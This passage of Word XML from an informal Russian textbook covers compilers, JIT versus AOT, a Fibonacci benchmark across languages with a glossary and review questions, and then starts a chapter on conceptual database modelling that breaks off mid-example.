      </w:pPr>
      <w:r>
        <w:t>**Julia JIT**.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>6.2.5. Сравнение производительности</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Давай сравним </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>одну и ту же программу</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (вычисление 40-го числа Фибоначчи) на разных языках.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Код (Python):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>def fib(n):</w:t>
        <w:br/>
        <w:t xml:space="preserve">    if n &lt;= 1:</w:t>
        <w:br/>
        <w:t xml:space="preserve">        return n</w:t>
        <w:br/>
        <w:t xml:space="preserve">    return fib(n-1) + fib(n-2)</w:t>
        <w:br/>
        <w:br/>
        <w:t>print(fib(40))</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Код (Java):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>public class Fib {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    static int fib(int n) {</w:t>
        <w:br/>
        <w:t xml:space="preserve">        if (n &lt;= 1) return n;</w:t>
        <w:br/>
        <w:t xml:space="preserve">        return fib(n-1) + fib(n-2);</w:t>
        <w:br/>
        <w:t xml:space="preserve">    }</w:t>
        <w:br/>
        <w:t xml:space="preserve">    public static void main(String[] args) {</w:t>
        <w:br/>
        <w:t xml:space="preserve">        System.out.println(fib(40));</w:t>
        <w:br/>
        <w:t xml:space="preserve">    }</w:t>
        <w:br/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Код (C):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>#include &lt;stdio.h&gt;</w:t>
        <w:br/>
        <w:br/>
        <w:t>int fib(int n) {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    if (n &lt;= 1) return n;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    return fib(n-1) + fib(n-2);</w:t>
        <w:br/>
        <w:t>}</w:t>
        <w:br/>
        <w:br/>
        <w:t>int main() {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    printf("%d\n", fib(40));</w:t>
        <w:br/>
        <w:t xml:space="preserve">    return 0;</w:t>
        <w:br/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Результаты (примерные, на современном процессоре):</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>| Язык | Время выполнения | Компилятор/интерпретатор |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>|------|-----------------|-------------------------|</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>C</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (gcc -O3) | 0.3 сек | GCC с максимальной оптимизацией |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>C++</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (g++ -O3) | 0.3 сек | G++ с максимальной оптимизацией |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Rust</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (--release) | 0.3 сек | Rust compiler (оптимизация через LLVM) |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Go</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | 0.5 сек | Go compiler (быстрая компиляция, но меньше оптимизаций) |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Java</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (JIT прогретый) | 0.4 сек | HotSpot JIT (после прогрева) |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>C#</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (.NET Core) | 0.4 сек | CLR JIT |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>JavaScript</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (Node.js V8) | 1.5 сек | V8 JIT |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Python</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (CPython) | 35 сек | Интерпретатор (без JIT) |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>PyPy</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | 3 сек | JIT-компилятор для Python |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Ruby</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | 50 сек | Интерпретатор |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Выводы:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Компилируемые языки (C, C++, Rust)** — самые быстрые.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**JIT-компиляция (Java, C#, PyPy)** — близко к компилируемым после прогрева.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Интерпретируемые (Python, Ruby)** — в 100+ раз медленнее.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Но!</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Это синтетический тест. В реальных приложениях узкое место часто не в CPU, а в I/O (диск, сеть, база данных), и разница стирается.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Когда JIT быстрее AOT</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">JIT-компилятор имеет преимущество: он видит </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>реальные данные выполнения</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> и может оптимизировать код под конкретные условия.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>public int process(Object obj) {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    if (obj instanceof String) {</w:t>
        <w:br/>
        <w:t xml:space="preserve">        return obj.toString().length();</w:t>
        <w:br/>
        <w:t xml:space="preserve">    }</w:t>
        <w:br/>
        <w:t xml:space="preserve">    return 0;</w:t>
        <w:br/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Если JIT видит, что 99% вызовов — это `String`, он может заинлайнить метод `.length()` и удалить проверку типа.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Результат:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Код на Java с JIT может обогнать аналогичный код на C++ (если в C++ компилятор не смог провести такую оптимизацию статически).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>6.2.6. Связь с другими главами</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Глава 6.1 (Классификация языков):** Мы говорили о компилируемых vs интерпретируемых языках. Теперь знаем, как они работают.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Глава 3.2 (Сервисное ПО):** Компиляторы и интерпретаторы — это часть сервисного ПО.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Глава 2.1 (Архитектура ЭВМ):** Компиляторы генерируют машинный код для конкретной архитектуры (x86, ARM, RISC-V).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Глава 5.1 (Алгоритмы):** Оптимизации компилятора (loop unrolling, inlining) напрямую влияют на сложность алгоритма.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Введённые термины</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Компиляция** — перевод кода на языке высокого уровня в машинный код.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Компилятор** — программа, выполняющая компиляцию (GCC, Clang, MSVC, Rust compiler).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Интерпретатор** — программа, выполняющая код построчно без компиляции (CPython, Ruby, PHP).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Токен** — элементарная единица языка (ключевое слово, переменная, оператор).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**AST (Abstract Syntax Tree)** — дерево абстрактного синтаксиса, иерархическое представление кода.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Оптимизация** — улучшение кода для повышения скорости или уменьшения размера.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Constant folding** — вычисление констант на этапе компиляции.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Dead code elimination** — удаление неиспользуемого кода.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Loop unrolling** — развёртка циклов для ускорения выполнения.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Inlining** — встраивание тела функции в место вызова.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Линковка (Linking)** — объединение объектных файлов в исполняемый файл.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Статическая линковка** — встраивание библиотек в исполняемый файл.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Динамическая линковка** — использование внешних библиотек (.dll, .so, .dylib).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Байт-код** — промежуточное представление кода (не машинный код, но ближе к нему).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**JIT (Just-In-Time) компиляция** — компиляция кода во время выполнения программы.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**AOT (Ahead-Of-Time) компиляция** — компиляция до запуска программы.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Виртуальная машина (VM)** — программный эмулятор компьютера для выполнения байт-кода.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**JVM (Java Virtual Machine)** — виртуальная машина Java.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**CLR (Common Language Runtime)** — виртуальная машина .NET.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**LLVM (Low Level Virtual Machine)** — инфраструктура компиляторов (используется Clang, Rust, Swift).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**LLVM IR (Intermediate Representation)** — промежуточное представление кода в LLVM.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Tiered Compilation** — многоуровневая компиляция (интерпретатор → быстрая компиляция → агрессивная оптимизация).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Garbage Collection (GC)** — автоматическая сборка мусора (управление памятью).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Флаги оптимизации** — параметры компилятора (-O0, -O1, -O2, -O3, -Os, -Ofast).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Контрольные вопросы</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Теория:** Назовите 5 этапов компиляции. Что делает каждый этап?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Практика:** Почему флаг `-O3` делает программу быстрее? Какие оптимизации применяет компилятор?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Сравнение:** В чём разница между компиляцией и интерпретацией? Приведите примеры языков для каждого типа.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**JIT:** Как работает JIT-компилятор? Почему он может быть быстрее AOT компиляции?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Практическая задача:** Напишите программу на C, скомпилируйте её с флагами `-O0` и `-O3`. Сравните размер исполняемого файла и время выполнения. Объясните разницу.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Анализ:** Почему Python в 100 раз медленнее C? Можно ли ускорить Python? (Подсказка: PyPy, Cython, Numba).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Проектирование:** Вы пишете программу для встроенной системы с 64 КБ памяти. Какой язык и компилятор выберете? Какие флаги компиляции используете?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Оптимизация:** Что такое "constant folding", "dead code elimination", "loop unrolling"? Приведите примеры каждой оптимизации.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Виртуальные машины:** В чём разница между JVM и LLVM? Какие языки используют каждую из них?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Философский вопрос:** Что важнее: скорость разработки или скорость выполнения? Когда стоит выбрать Python, а когда — C++?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Ответы на вопрос 10:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Python:** Прототипы, скрипты, веб, Data Science (большую часть времени программа ждёт I/O, а не вычисляет).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**C++:** Игры, системное ПО, драйверы, high-frequency trading (критична каждая микросекунда).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Гибрид:** Пиши на Python, оптимизируй узкие места на C/C++ (например, NumPy — это обёртка над C, поэтому NumPy массивы обрабатываются быстро).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Конец главы 6.2.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Теперь ты знаешь, как код превращается в программу, почему одни языки быстрые, а другие — нет, и почему твой препод так любит флаг `-O3`. Не благодари, иди сдавай экзамен 🚀</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>Глава 7.1. Инфологическое моделирование предметной области</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Введение</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Представь: тебе надо создать базу данных для университета. С чего начать? С создания таблиц в MySQL? С написания кода на Python? Нихуя подобного. Сначала надо </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>понять</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, что вообще хранить, как это связано между собой, и какие данные критичны. Вот для этого и существует </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>инфологическое моделирование</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — первый и самый важный этап проектирования баз данных.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Инфологическое моделирование — это описание предметной области на языке, понятном человеку, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>без привязки к конкретной СУБД</w:t>
      </w:r>
      <w:r>
        <w:t>. Ты просто рисуешь картинку: вот тут студенты, вот тут курсы, вот они связаны вот так. Никаких `VARCHAR(255)`, никаких `FOREIGN KEY REFERENCES` — только чистая логика.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Эта глава связана с:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Главой 4.1 (Жизненный цикл БД)** — инфологическое моделирование является первым этапом проектирования</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Главой 7.2 (Архитектура БД)** — модель будет преобразована в логическую, а затем в физическую</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Главой 7.3 (Реляционные БД)** — ER-диаграммы превратятся в таблицы с ключами и индексами</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>1. Уровни представления данных</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Проектирование БД происходит в три этапа, каждый со своей моделью:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>1.1. Инфологическая (концептуальная) модель</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Что</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: описание предметной области на языке бизнес-логики  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Для кого</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: аналитики, заказчики, менеджеры  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Инструмент</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: ER-диаграммы (Entity-Relationship)  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Привязка к СУБД</w:t>
      </w:r>
      <w:r>
        <w:t>: нет</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Пример: «Студент учится на курсе. Преподаватель ведёт курс. Студент получает оценку за курс.»</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>1.2. Даталогическая (логическая) модель</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Что</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: преобразование ER-диаграммы в структуру таблиц  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Для кого</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: разработчики, архитекторы БД  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Инструмент</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: схемы таблиц с типами данных  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Привязка к СУБД</w:t>
      </w:r>
      <w:r>
        <w:t>: да (реляционная модель, но без специфики СУБД)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Пример:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Студент (id, фамилия, имя, группа)</w:t>
        <w:br/>
        <w:t>Курс (id, название, кредиты)</w:t>
        <w:br/>
        <w:t>Оценка (студент_id, курс_id, балл, дата)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>1.3. Физическая модель</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Что</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: реализация в конкретной СУБД с индексами, триггерами, хранимыми процедурами  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Для кого</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: DBA (администраторы БД)  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Инструмент</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: SQL DDL (Data Definition Language)  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Привязка к СУБД</w:t>
      </w:r>
      <w:r>
        <w:t>: жёсткая (MySQL, PostgreSQL, Oracle)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Пример:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>CREATE TABLE student (</w:t>
        <w:br/>
        <w:t xml:space="preserve">    id INT PRIMARY KEY AUTO_INCREMENT,</w:t>
        <w:br/>
